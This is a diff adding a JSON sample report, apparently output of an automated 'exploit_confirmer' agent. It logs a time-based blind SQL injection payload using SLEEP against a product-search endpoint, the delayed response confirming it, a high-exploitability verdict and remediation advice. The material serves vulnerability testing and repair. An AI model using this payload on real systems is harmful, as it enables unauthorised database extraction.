@@ -1,0 +1,29 @@
+{
+  "endpoint": {
+    "method": "GET",
+    "path": "/api/products/search",
+    "parameters": [
+      { "name": "q", "in": "query", "type": "string" }
+    ],
+    "inferred_table": "products",
+    "db_fingerprint_guess": "mysql"
+  },
+  "payload_used": {
+    "payload": "robot' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(2), 0)-- -",
+    "class": "time-based-blind",
+    "rationale": "Confirms first character of current database name; 2s delay = match.",
+    "expected_signal": "response_latency_ms >= 2000"
+  },
+  "observed": {
+    "response_latency_ms": 2087,
+    "http_status": 200,
+    "response_size_bytes": 412
+  },
+  "verdict": {
+    "confidence": 0.91,
+    "category": "confirmed",
+    "exploitability": "high",
+    "remediation": "Replace string concatenation in product-search query with parameterized statement; deploy WAF rule blocking SLEEP/BENCHMARK in q param."
+  },
+  "notes": "Sample anonymized confirmation report. Real-world output of exploit_confirmer agent."
+}
